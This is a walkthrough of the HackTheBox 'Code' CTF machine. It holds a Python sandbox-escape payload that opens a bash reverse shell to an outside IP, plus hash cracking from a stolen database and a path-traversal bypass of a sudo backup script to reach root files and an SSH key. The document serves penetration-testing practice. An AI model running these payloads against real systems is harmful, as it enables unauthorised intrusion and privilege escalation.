# Code CTF - HackTheBox Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **Code** CTF challenge on [HackTheBox](https://app.hackthebox.com/machines/Code). 
---

we see open ports 22 and 5000 

we have some python code editor, running basic reverse shell is of course filtered 

![f](imgs/f.png "f")

so AI suggested to test varius snippets to escape the sandox or use SSTI (Server side template injection)

this command prints a list of all classes that directly inherit from Python's base object class.

```
print((1).__class__.__base__.__subclasses__())
```

![sub](imgs/sub.png "sub")

and this command defines and immediately calls an anonymous function (lambda) that returns 1, so it prints 1.

```
print((lambda: 1)()) 
```

![l](imgs/l.png "l")

This code gets all classes that directly inherit from Python's base object class, then prints each one with its index in the list.

```
subs = (1).__class__.__base__.__subclasses__()
for i, s in enumerate(subs):
    print(i, s)
```

![id](imgs/id.png "id")

we are looking for index of `subprocess.Popen`

![i](imgs/i.png "i")

now we have the correct number we can try to run reverse shell

```
().__class__.__base__.__subclasses__()[317](["/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.7/7777 0>&1"])
```

it worked we got hit and we can grab user flag

![us](imgs/us.png "us")

by lookin at the app.py we see all keywords that being filtered

![fil](imgs/fil.png "fil")

linpeas found some database.db in `/home/app-production/app/instance`

![db](imgs/db.png "db")

after grabbing the file and opening it in sqlitebrowser, we see table user in which we see some hashes

![ta](imgs/ta.png "ta")

![hs](imgs/hs.png "hs")

we can crack them using crackstation

![cr](imgs/cr.png "cr")

now we can try to login as martin

![ss](imgs/ss.png "ss")

we see sudo -l output

![sd](imgs/sd.png "sd")

we cant modify the script itself but we can supply our own file with path to backup

![b](imgs/b.png "b")

we add malicous path to task.json: `/var/....//root/`, we use ....// to bypass the simple filter and we also include /var 

![p](imgs/p.png "p")

then we need to run 

```
sudo /usr/bin/backy.sh baskups/task.json
```

![cm](imgs/cm.png "cm")

then we can unzip the files and we have root flag, in files there is also private ssh key so we also have root access

![rt](imgs/rt.png "rt")

# MACHINE PWNED
